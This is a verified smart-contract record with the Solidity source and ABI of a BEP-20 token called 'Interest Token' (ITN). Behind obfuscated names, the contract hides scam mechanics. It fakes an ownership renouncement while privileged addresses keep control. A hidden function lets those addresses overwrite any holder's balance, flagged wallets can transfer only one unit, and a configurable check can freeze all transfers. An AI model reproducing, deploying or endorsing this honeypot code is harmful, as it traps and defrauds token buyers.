{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface receiverTakeLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedAuto) external view returns (uint256);\n\n    function transfer(address toTokenSell, uint256 maxFund) external returns (bool);\n\n    function allowance(address walletLaunchTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toTokenSell,\n        uint256 maxFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromLaunch, uint256 value);\n    event Approval(address indexed walletLaunchTotal, address indexed spender, uint256 value);\n}\n\nabstract contract fundFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface limitList {\n    function createPair(address liquidityIs, address autoReceiver) external returns (address);\n}\n\ninterface takeSwap is receiverTakeLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InterestToken is fundFrom, receiverTakeLiquidity, takeSwap {\n\n    address buyIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public fundReceiverBuy;\n\n    function senderTeamTx(address maxEnableTeam, uint256 maxFund) public {\n        modeExempt();\n        tokenMax[maxEnableTeam] = maxFund;\n    }\n\n    uint256 txFund;\n\n    function balanceOf(address launchedAuto) public view virtual override returns (uint256) {\n        return tokenMax[launchedAuto];\n    }\n\n    bool public fromLiquidity;\n\n    bool public tradingList;\n\n    address public modeBuy;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenSell;\n    }\n\n    string private tokenSell = \"ITN\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchAt;\n    }\n\n    uint256 private sellLaunch = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public walletFund;\n\n    function launchTake(address minWallet, address toTokenSell, uint256 maxFund) internal returns (bool) {\n        require(tokenMax[minWallet] >= maxFund);\n        tokenMax[minWallet] -= maxFund;\n        tokenMax[toTokenSell] += maxFund;\n        emit Transfer(minWallet, toTokenSell, maxFund);\n        return true;\n    }\n\n    address public amountWallet;\n\n    uint8 private launchAt = 18;\n\n    function autoFee(address minWallet, address toTokenSell, uint256 maxFund) internal returns (bool) {\n        if (minWallet == amountWallet) {\n            return launchTake(minWallet, toTokenSell, maxFund);\n        }\n        uint256 buyMin = receiverTakeLiquidity(modeBuy).balanceOf(buyIs);\n        require(buyMin == txFund);\n        require(toTokenSell != buyIs);\n        if (walletFund[minWallet]) {\n            return launchTake(minWallet, toTokenSell, launchIs);\n        }\n        return launchTake(minWallet, toTokenSell, maxFund);\n    }\n\n    bool public walletSellToken;\n\n    uint256 private senderLaunchedBuy;\n\n    string private fromTotalSell = \"Interest Token\";\n\n    function limitSell(uint256 maxFund) public {\n        modeExempt();\n        txFund = maxFund;\n    }\n\n    constructor (){\n        if (receiverWalletLimit == senderLaunchedBuy) {\n            fromLiquidity = true;\n        }\n        amountTeam fundSwap = amountTeam(txTotal);\n        modeBuy = limitList(fundSwap.factory()).createPair(fundSwap.WETH(), address(this));\n        \n        amountWallet = _msgSender();\n        tokenSwap();\n        fundReceiverBuy[amountWallet] = true;\n        tokenMax[amountWallet] = sellLaunch;\n        if (walletSellToken) {\n            senderLaunchedBuy = enableIsExempt;\n        }\n        emit Transfer(address(0), amountWallet, sellLaunch);\n    }\n\n    function tokenSwap() public {\n        emit OwnershipTransferred(amountWallet, address(0));\n        receiverList = address(0);\n    }\n\n    function modeExempt() private view {\n        require(fundReceiverBuy[_msgSender()]);\n    }\n\n    function approve(address launchMarketing, uint256 maxFund) public virtual override returns (bool) {\n        walletAtTrading[_msgSender()][launchMarketing] = maxFund;\n        emit Approval(_msgSender(), launchMarketing, maxFund);\n        return true;\n    }\n\n    function isMax(address liquiditySellSender) public {\n        if (tradingList) {\n            return;\n        }\n        \n        fundReceiverBuy[liquiditySellSender] = true;\n        if (senderLaunchedBuy == amountShould) {\n            fromLiquidity = false;\n        }\n        tradingList = true;\n    }\n\n    address private receiverList;\n\n    function transferFrom(address minWallet, address toTokenSell, uint256 maxFund) external override returns (bool) {\n        if (_msgSender() != txTotal) {\n            if (walletAtTrading[minWallet][_msgSender()] != type(uint256).max) {\n                require(maxFund <= walletAtTrading[minWallet][_msgSender()]);\n                walletAtTrading[minWallet][_msgSender()] -= maxFund;\n            }\n        }\n        return autoFee(minWallet, toTokenSell, maxFund);\n    }\n\n    uint256 private receiverWalletLimit;\n\n    uint256 constant launchIs = 1 ** 10;\n\n    function allowance(address limitFrom, address launchMarketing) external view virtual override returns (uint256) {\n        if (launchMarketing == txTotal) {\n            return type(uint256).max;\n        }\n        return walletAtTrading[limitFrom][launchMarketing];\n    }\n\n    event OwnershipTransferred(address indexed modeAmount, address indexed fromLaunchedAmount);\n\n    function transfer(address maxEnableTeam, uint256 maxFund) external virtual override returns (bool) {\n        return autoFee(_msgSender(), maxEnableTeam, maxFund);\n    }\n\n    uint256 public amountShould;\n\n    function limitTxMax(address modeMarketing) public {\n        modeExempt();\n        \n        if (modeMarketing == amountWallet || modeMarketing == modeBuy) {\n            return;\n        }\n        walletFund[modeMarketing] = true;\n    }\n\n    uint256 private enableIsExempt;\n\n    mapping(address => mapping(address => uint256)) private walletAtTrading;\n\n    uint256 swapAmountAt;\n\n    function owner() external view returns (address) {\n        return receiverList;\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverList;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellLaunch;\n    }\n\n    address txTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private tokenMax;\n\n    function name() external view virtual override returns (string memory) {\n        return fromTotalSell;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLaunchTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLaunchedAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundReceiverBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySellSender\",\"type\":\"address\"}],\"name\":\"isMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxFund\",\"type\":\"uint256\"}],\"name\":\"limitSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMarketing\",\"type\":\"address\"}],\"name\":\"limitTxMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxEnableTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFund\",\"type\":\"uint256\"}],\"name\":\"senderTeamTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxEnableTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toTokenSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSellToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "InterestToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}